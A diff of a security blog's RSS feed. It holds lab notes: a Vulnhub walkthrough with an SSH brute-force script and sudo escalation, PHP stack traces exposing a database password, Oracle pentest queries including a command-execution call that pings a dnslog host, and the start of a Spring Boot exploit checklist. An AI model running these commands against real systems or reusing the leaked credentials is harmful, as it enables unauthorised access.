@@ -1,30 +1,2349 @@
----
----
 <?xml version="1.0" encoding="UTF-8"?>
-<?xml-stylesheet type="text/css" href="{{ "/assets/css/rss.css" | prepend: site.baseurl }}" ?>
+<?xml-stylesheet type="text/css" href="/assets/css/rss.css" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>{{ site.title | xml_escape }}</title>
-    <description>{{ site.description | xml_escape }}</description>
-    <link>{{ site.url }}{{ site.baseurl }}/</link>
-    <atom:link href="{{ "/feed.xml" | prepend: site.baseurl | prepend: site.url }}" rel="self" type="application/rss+xml" />
-    <pubDate>{{ site.time | date_to_rfc822 }}</pubDate>
-    <lastBuildDate>{{ site.time | date_to_rfc822 }}</lastBuildDate>
-    <generator>Jekyll v{{ jekyll.version }}</generator>
-    {% for post in site.posts limit:10 %}
+    <title>©「哨兵」| Sentry Security</title>
+    <description>哨兵安全实验室</description>
+    <link>https://www.sentrylab.cn/</link>
+    <atom:link href="https://sentrylab.cn/feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Thu, 18 Feb 2021 10:07:58 +0800</pubDate>
+    <lastBuildDate>Thu, 18 Feb 2021 10:07:58 +0800</lastBuildDate>
+    <generator>Jekyll v3.9.0</generator>
+    
       <item>
-        <title>{{ post.categories.first }}: {{ post.title | xml_escape }}</title>
-        <description>{% if post.place %} &lt;p&gt; Location: {{ post.place | xml_escape }} &lt;/p&gt; {% endif %}{{ post.content | xml_escape }}</description>
-        <pubDate>{{ post.date | date_to_rfc822 }}</pubDate>
-        <link>{{ post.url | prepend: site.baseurl | prepend: site.url }}</link>
-        <guid isPermaLink="true">{{ post.url | prepend: site.baseurl | prepend: site.url }}</guid>
-        {% for tag in post.tags %}
-        <category>{{ tag | xml_escape }}</category>
-        {% endfor %}
-        {% for cat in post.categories %}
-        <category>{{ cat | xml_escape }}</category>
-        {% endfor %}
+        <title>event: 更新于2021/02/09-「置顶文章速览」</title>
+        <description> &lt;p&gt; Location: 安庆·安徽 &lt;/p&gt; &lt;hr /&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;「哨兵安全」：markdown用法一览，手打wiki以便使用SentryLab「markdown」
+    &lt;ul&gt;
+      &lt;li&gt;放置于公告窗口置顶下：&lt;a href=&quot;https://about.sentrylab.cn/news/sentry-lab-markdown-usage/&quot;&gt;SentryLab「markdown」语法介绍&amp;amp;批注&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;2021/02/04：已更新「我的研究」栏目文章：
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;https://about.sentrylab.cn/help/Mod-Waf-Bypass-Walkthrough/&quot;&gt;「分享」ModsecWAF：老牌开源waf的绕过历程&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;https://about.sentrylab.cn/help/ShiroDeser/&quot;&gt;分享：Different Shiro Framework deserialization analysis ideas&lt;/a&gt;（重构文章框架）&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;https://about.sentrylab.cn/help/SpringBoot-Memory-files-heapdump-Analysis/&quot;&gt;思路：heapdump文件分析历程&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;2021/02/09已更新：
+    &lt;ul&gt;
+      &lt;li&gt;1、修改于&lt;a href=&quot;/feed.xml&quot;&gt;订阅&lt;/a&gt;的不匹配问题；&lt;/li&gt;
+      &lt;li&gt;2、导航栏处添加&lt;a href=&quot;http://wiki.sentrylab.cn&quot;&gt;WIKI&lt;/a&gt;栏目，供参考。&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>Fri, 01 Jan 2021 00:00:00 +0800</pubDate>
+        <link> https://www.sentrylab.cn/event/2021/sentry-lab-markdown-usage/</link>
+        <guid isPermaLink="true">/event/2021/sentry-lab-markdown-usage/</guid>
+        
+        <category>笔记</category>
+        
+        <category>wiki</category>
+        
+        
+        <category>event</category>
+        
       </item>
-    {% endfor %}
+    
+      <item>
+        <title>blog: GainPower靶场渗透历程</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;employee1:ssh banner发现问题；
+    &lt;ul&gt;
+      &lt;li&gt;根据提示获得低权限shell&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;employee64:考验脚本编写能力（ssh爆破）
+    &lt;ul&gt;
+      &lt;li&gt;bash脚本批量连接&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;programmer:获取sudo shell
+    &lt;ul&gt;
+      &lt;li&gt;通过unshare切换到sudo用户&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ su - employee64&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ sudo -u programmer unshare&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;vanshal:crontab计划获取shell
+    &lt;ul&gt;
+      &lt;li&gt;pspy tool to detected&lt;/li&gt;
+      &lt;li&gt;/media/programmer/scripts/backup.sh&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;root:secert zip file
+    &lt;ul&gt;
+      &lt;li&gt;zip password crack&lt;/li&gt;
+      &lt;li&gt;login ajenti to run root shell.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;写个脚本来批量跑试试看：&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/bin/bash
+
+pwn () {
+  read -p 'target ip: ' ip
+  sleep 2
+  for data in {1..100}
+  do
+      echo 'Try: ' $data
+      sshpass -p 'employee'$data ssh employee$data@$ip 'echo employee'$data' | sudo -S -l'
+      printf &quot;\n&quot;
+  done
+}
+
+pwn
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;for一下用户名密码{employee+$data}in{1..100}，使用sshpass进行批量ssh连接认证，并尝试&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;;
+失败如下：&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[sudo] employee100 的密码：对不起，用户 employee100 不能在 localhost 上运行 sudo。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;成功：&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[sudo] employee64 的密码：匹配 %2$s 上 %1$s 的默认条目：
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;, secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+用户 employee64 可以在 localhost 上运行以下命令：
+    (programmer) /usr/bin/unshare
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;所以用户employee64是拥有sudo权限；&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 02 Dec 2020 00:00:00 +0800</pubDate>
+        <link> https://www.sentrylab.cn/blog/GainPower/walkthrough/</link>
+        <guid isPermaLink="true">/blog/GainPower/walkthrough/</guid>
+        
+        
+        <category>blog</category>
+        
+        <category>Vulnhub</category>
+        
+        <category>笔记</category>
+        
+      </item>
+    
+      <item>
+        <title>blog: PHP:部署的一揽子问题</title>
+        <description>&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Wed Nov 25 17:19:33.475439 2020] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;php7:notice] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;pid 11872] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;client 10.211.55.2:53568] PHP Notice:  Undefined index: step &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /var/www/
+html/code/BabyOnline1/setup/setupwizard.php on line 4 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Wed Nov 25 17:19:33.475577 2020] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;php7:error] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;pid 11872] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;client 10.211.55.2:53568] 
+PHP Fatal error:  Uncaught Error: Class &lt;span class=&quot;s1&quot;&gt;'DOMDocument'&lt;/span&gt; not found &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /var/www/html/code/BabyOnline1/setup/setupwizard.php:46&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;
+Stack trace:&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0 {main}\n  thrown in /var/www/html/code/BabyOnline1/setup/setupwizard.php on line 46&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Wed Nov 25 17:21:46.224793 2020] [php7:error] [pid 11882] [client 10.211.55.2:53602] PHP Fatal error:  Uncaught Error: 
+Call to undefined function mysqli_connect() in 
+
+/var/www/html/code/BabyOnline1/utility/mysqli5.php:39\nStack trace:\n#0 /var/www/html/code/BabyOnline1/utility/fun.class.php(281): 
+Conn-&amp;gt;__construct('localhost', '3306', 'root', 'tsinglink', 'qx_bbol', 'UTF8', true)\n#1 /var/www/html/code/BabyOnline1/utility/fun.class.php
+(255): Utility-&amp;gt;CreateDBConnect('localhost', '3306', 'root', 'tsinglink', 'qx_bbol', 'UTF8')\n#2 /var/www/html/code/BabyOnline1/platform/php/
+ini.php(41): Utility-&amp;gt;__construct()\n#3 /var/www/html/code/BabyOnline1/platform/php/plat_manage.php(5): require_once('/var/www/html/c...')
+\n#4 {main}\n  thrown in /var/www/html/code/BabyOnline1/utility/mysqli5.php on line 39, referer: http://10.211.55.4/platform/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;提示在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/code/BabyOnline1/utility/fun.class.php(281)&lt;/code&gt;文件、
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/code/BabyOnline1/platform/php/ini.php(41)&lt;/code&gt;文件
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/code/BabyOnline1/utility/mysqli5.php on line 39&lt;/code&gt;文件&lt;/p&gt;
+
+&lt;p&gt;第一个fun.class.php文件是实现的日志写入数据库的功能；&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function WriterToDB($typeid,$clientAddress,$datetime,$file,$line,$function,$content)
+	{
+		global $utility;
+		if(is_array($content))
+		{
+			$conn = $utility-&amp;gt;CreateDBConnect($_SESSION[&quot;DB&quot;][&quot;Host&quot;],$_SESSION[&quot;DB&quot;][&quot;Port&quot;],$_SESSION[&quot;DB&quot;][&quot;User&quot;],$_SESSION[&quot;DB&quot;][&quot;Password&quot;],$_SESSION[&quot;DB&quot;][&quot;Name&quot;],$_SESSION[&quot;DB&quot;][&quot;Character&quot;]);
+			$conn-&amp;gt;Query(&quot;INSERT INTO `NMIOperationLog` (`Index`,`Operation`,`OperationTime`,`Description`,`ManageDomainUserInfo_Index`,`ManageDomain_Index`,`ManageDomainUserInfo_Identity`,`ManageDomains`,`SqlScript`)VALUES(null,'&quot;.$content[&quot;Operation&quot;].&quot;','&quot;.$content[&quot;OperationTime&quot;].&quot;','&quot;.addslashes($content[&quot;Description&quot;]).&quot;','&quot;.$content[&quot;ManageDomainUserInfo_Index&quot;].&quot;','&quot;.$content[&quot;ManageDomain_Index&quot;].&quot;','&quot;.$content[&quot;ManageDomainUserInfo_Identity&quot;].&quot;','&quot;.$content[&quot;ManageDomains&quot;].&quot;','&quot;.addslashes($content[&quot;SqlScript&quot;]).&quot;') &quot;);
+	
+			//$log-&amp;gt;Writer(1,&quot;NMI&quot;,strftime(&quot;%Y-%m-%d %H:%M:%S&quot;,time()),__FILE__,__LINE__,__FUNCTION__,mysql_error());
+			
+		}
+		return true;
+	}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;连库WriterToDB实现功能如上；同样的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ini.php&lt;/code&gt;同样定义了数据库的配置信息包括类型、url和连接信息：&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;define('LOGSAVETYPE',1);
+define('LOGLEVEL',1);
+
+define('DB_TYPE', &quot;mysql&quot;); 
+define('IMAGE_URL', &quot;http://61.191.35.32:8580/BabyOnline/&quot;);
+define('DB_SOURCEFILE_PATH',dirname(dirname(dirname(__FILE__))).&quot;/utility/dbsource.ini&quot;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dbsource.ini&lt;/code&gt;文件里面则详细配置了jdbc的配置信息，就不单独放出来了；再来看看最后一个文件，同样是连接数据库，然后发现了一些有趣的：
+随意捡了一些构造函数：&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function QueryRecordCount($sqlstr)
+	{
+		if($this-&amp;gt;connect)
+		{
+			unset($row);
+			$row=$this-&amp;gt;FetchArray($this-&amp;gt;Query(&quot;SELECT count(1) as RecordCount FROM &quot;.$sqlstr.&quot; &quot;));
+			return ($row['RecordCount'] &amp;gt; 0 ? $row['RecordCount'] : 0);
+		}
+		else
+		{
+			return 0;
+		}
+	}
+
+
+if($link-&amp;gt;FetchArray($link-&amp;gt;query(&quot;SELECT * FROM User WHERE `Identity`='$UserId' AND AreaCode='$AreaCode'&quot;)))
+    {
+    ···
+    }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;咳咳，跑偏了，以上来看就直接修改ini文件就行了。&lt;/p&gt;
+</description>
+        <pubDate>Wed, 25 Nov 2020 00:00:00 +0800</pubDate>
+        <link> https://www.sentrylab.cn/blog/2020/php-depoly/</link>
+        <guid isPermaLink="true">/blog/2020/php-depoly/</guid>
+        
+        
+        <category>blog</category>
+        
+        <category>php</category>
+        
+        <category>笔记</category>
+        
+      </item>
+    
+      <item>
+        <title>blog: 随笔记：Oracle数据库的渗透测试</title>
+        <description>&lt;p&gt;使用docker进行oracle数据库渗透测试，环境如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/b30021a421b8&quot;&gt;docker启动oracle&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;参考链接：&lt;a href=&quot;https://www.freebuf.com/articles/web/5411.html&quot;&gt;Oracle爆错手工注入&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;渗透常用语句：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;
+1 当前用户权限 
+select * from session_roles
+2 当前数据库版本 
+select banner from sys.v_$version where rownum=1
+3 服务器出口IP 
+用utl_http.request 可以实现
+4 服务器监听IP d
+select utl_inaddr.get_host_address from dual
+5 服务器操作系统
+select member from v$logfile where rownum=1
+6 服务器sid查询，远程连接的话需要
+select instance_name fromv$instance;
+7 当前连接用户
+select SYS_CONTEXT ('USERENV', 'CURRENT_USER')from dual
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;版本：&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from v&lt;span class=&quot;nv&quot;&gt;$version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+Oracle Database 11g Enterprise Edition Release 11.2.0.4.0 - 64bit Production
+PL/SQL Release 11.2.0.4.0 - Production
+CORE	11.2.0.4.0	Production
+TNS &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Linux: Version 11.2.0.4.0 - Production
+NLSRTL Version 11.2.0.4.0 - Production
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;oracleShell.jar环境&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - Production
+PL/SQL Release 11.2.0.1.0 - Production
+&lt;span class=&quot;s2&quot;&gt;&quot;CORE	11.2.0.1.0	Production&quot;&lt;/span&gt;
+TNS &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;32-bit Windows: Version 11.2.0.1.0 - Production
+NLSRTL Version 11.2.0.1.0 - Production
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;select utl_inaddr.get_host_address from dual&lt;/p&gt;
+
+&lt;p&gt;172.17.0.2&lt;/p&gt;
+
+&lt;p&gt;补丁：&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from dba_registry_history&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+
+2018-04-25 12:22:17.105985	APPLY	SERVER	11.2.0.4	0	PSU	Patchset 11.2.0.2.0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;权限：&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from session_roles&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+CONNECT
+RESOURCE
+DBA
+SELECT_CATALOG_ROLE
+HS_ADMIN_SELECT_ROLE
+EXECUTE_CATALOG_ROLE
+HS_ADMIN_EXECUTE_ROLE
+DELETE_CATALOG_ROLE
+EXP_FULL_DATABASE
+IMP_FULL_DATABASE
+DATAPUMP_EXP_FULL_DATABASE
+DATAPUMP_IMP_FULL_DATABASE
+GATHER_SYSTEM_STATISTICS
+SCHEDULER_ADMIN
+WM_ADMIN_ROLE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Select DBMS_JAVA_TEST.FUNCALL&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'oracle/aurora/util/Wrapper'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'main'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'/bin/bash'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'-c'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'ping ojuht0.dnslog.cn'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; from dual&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Thu, 29 Oct 2020 00:00:00 +0800</pubDate>
+        <link> https://www.sentrylab.cn/blog/2020/Oracle-sql/</link>
+        <guid isPermaLink="true">/blog/2020/Oracle-sql/</guid>
+        
+        
+        <category>blog</category>
+        
+        <category>Sql-Inject</category>
+        
+        <category>笔记</category>
+        
+      </item>
+    
+      <item>
+        <title>blog: 有关于网络安全行业的一些思考</title>
+        <description>&lt;h3 id=&quot;under-construction&quot;&gt;Under construction&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;div class=&quot;d-none d-sm-block position-absolute col-5 col-md-4 col-lg-3 bottom-0 right-0 mr-lg-5 mb-md-n4&quot;&gt;
+
+&lt;!-- this is a gap between text and pics:) --&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;d-none d-sm-block position-absolute col-5 col-md-4 col-lg-3 bottom-0 right-0 mr-lg-5 mb-md-n4&quot;&gt;
+
+&lt;!-- this is a gap between text and pics:) --&gt;
+&lt;/div&gt;
+&lt;div class=&quot;d-none d-sm-block position-absolute col-5 col-md-4 col-lg-3 bottom-0 right-0 mr-lg-5 mb-md-n4&quot;&gt;
+
+&lt;!-- this is a gap between text and pics:) --&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;d-none d-sm-block position-absolute col-5 col-md-4 col-lg-3 bottom-0 right-0 mr-lg-5 mb-md-n4&quot;&gt;
+&lt;div class=&quot;width-full&quot;&gt;
+&lt;svg viewBox=&quot;0 0 300 305&quot; class=&quot;width-fit&quot;&gt;
+&lt;defs&gt;
+&lt;mask id=&quot;https___github_githubassets_com_images_modules_site_home_astro-mona-alpha_jpg&quot;&gt;
+&lt;image width=&quot;300&quot; height=&quot;305&quot; href=&quot;/assets/img/post-bg/astro-mona-alpha.jpg&quot;&gt;&lt;/image&gt;
+&lt;/mask&gt;
+&lt;/defs&gt;
+&lt;image mask=&quot;url(#https___github_githubassets_com_images_modules_site_home_astro-mona-alpha_jpg)&quot; width=&quot;300&quot; height=&quot;305&quot; href=&quot;/assets/img/post-bg/astro-mona.jpg&quot;&gt;&lt;/image&gt;
+&lt;/svg&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;!--	oopos！被你发现了！
+* it工作人员（包括运维、开发等等）公司内的矛盾
+
+* 软件开发和传统安全公司之间的矛盾
+
+网络防火墙作为访问控制设备，主要工作在OSI模型三、四层，基于IP报文进行检测。只是对端口做限制，对TCP协议做封堵。
+其产品设计无需理解HTTP会话，也就决定了无法理解Web应用程序语言如HTML、SQL语言。因此，它不可能对HTTP通讯进行输入验证或攻击规则分析。针对Web网站的恶意攻击绝大部分都将封装为HTTP请求，从80或443端口顺利通过防火墙检测。 
+一些定位比较综合、提供丰富功能的防火墙，也具备一定程度的应用层防御能力，如能根据TCP会话异常性及攻击特征阻止网络层的攻击，通过IP分拆和组合也能判断是否有攻击隐藏在多个数据包中，但从根本上说他仍然无法理解HTTP会话，难以应对如SQL注入、跨站脚本、cookie窃取、网页篡改等应用层攻击。 
+web应用防火墙能在应用层理解分析HTTP会话，因此能有效的防止各类应用层攻击，同时他向下兼容，具备网络防火墙的功能。 --&gt;
+
+&lt;html&gt;
+&lt;head&gt;
+	&lt;title&gt;&lt;/title&gt;
+&lt;!-- &lt;link href=&quot;/assets/css/bg.css&quot; rel=&quot;stylesheet&quot;&gt; --&gt;
+&lt;script&gt;
+var consoleConfig = {
+welcome: '\n哈？(づ｡◕‿‿◕｡)づ！你在偷看什么。本文还在&quot;思考&quot;中...\n',
+theme: '\n1、it工作人员（包括运维、开发等等）公司内的矛盾\n2、软件开发和传统安全公司之间的矛盾  \n\n源码:https://github.com/Bin4xin/bin4xin.github.io \n\n如果喜欢可以 %c star%c  %c支持一下%c  ❤️~\n',
+
+};
+
+var consoleInfo = (function(consoleConfig) {
+console.log('%c' + consoleConfig.welcome, 'color: #6190e8');
+console.log('%c' + consoleConfig.theme, 'color: #6190e8;','padding: 0 5px;color: #fff;background: #6190e8;','color: #6190e8;','padding: 0 5px;color: #fff;background: #6190e8;','color: #6190e8;');
+console.log('%c' + consoleConfig.qrcode, 'color: #6190e8');
+console.log('%c' + consoleConfig.search, 'color: #6190e8');
+
+}(consoleConfig));&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</description>
+        <pubDate>Fri, 25 Sep 2020 00:00:00 +0800</pubDate>
+        <link> https://www.sentrylab.cn/blog/2020/think-about-cyber-security/</link>
+        <guid isPermaLink="true">/blog/2020/think-about-cyber-security/</guid>
+        
+        
+        <category>blog</category>
+        
+        <category>笔记</category>
+        
+      </item>
+    
+      <item>
+        <title>blog: 不得不谈的：「Spring Boot」未授权渗透</title>
+        <description>&lt;h4 id=&quot;spring-boot-vulnerability-exploit-checklist&quot;&gt;Spring Boot Vulnerability Exploit CheckList&lt;/h4&gt;
+
+&lt;p&gt;Spring Boot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list&lt;/p&gt;
+
+&lt;h3 id=&quot;声明&quot;&gt;声明&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit&quot;&gt;这是转载地址&lt;/a&gt;，
+&lt;strong&gt;若作者介意请联系：「chihou.pro@gmail.com」删除转载文章&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;目录&quot;&gt;目录&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;#spring-boot-vulnerability-exploit-checklist&quot;&gt;Spring Boot Vulnerability Exploit CheckList&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#%E9%9B%B6%E8%B7%AF%E7%94%B1%E5%92%8C%E7%89%88%E6%9C%AC&quot;&gt;零：路由和版本&lt;/a&gt;
+        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#0x01%E8%B7%AF%E7%94%B1%E7%9F%A5%E8%AF%86&quot;&gt;0x01：路由知识&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#0x02%E7%89%88%E6%9C%AC%E7%9F%A5%E8%AF%86&quot;&gt;0x02：版本知识&lt;/a&gt;
+            &lt;ul&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%B8%B8%E8%A7%81%E7%BB%84%E4%BB%B6%E7%9A%84%E7%89%88%E6%9C%AC%E7%9B%B8%E4%BA%92%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB&quot;&gt;常见组件的版本相互依赖关系：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#spring-cloud-%E4%B8%8E-spring-boot-%E5%A4%A7%E7%89%88%E6%9C%AC%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB&quot;&gt;Spring Cloud 与 Spring Boot 大版本之间的依赖关系：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#spring-cloud-%E5%B0%8F%E7%89%88%E6%9C%AC%E5%8F%B7%E7%9A%84%E5%90%8E%E7%BC%80%E5%8F%8A%E5%90%AB%E4%B9%89&quot;&gt;Spring Cloud 小版本号的后缀及含义:&lt;/a&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#%E4%B8%80%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2&quot;&gt;一：信息泄露&lt;/a&gt;
+        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#0x01%E8%B7%AF%E7%94%B1%E5%9C%B0%E5%9D%80%E5%8F%8A%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E8%AF%A6%E6%83%85%E6%B3%84%E6%BC%8F&quot;&gt;0x01：路由地址及接口调用详情泄漏&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#0x02%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E8%80%8C%E6%9A%B4%E9%9C%B2%E7%9A%84%E8%B7%AF%E7%94%B1&quot;&gt;0x02：配置不当而暴露的路由&lt;/a&gt;&lt;/li&gt;
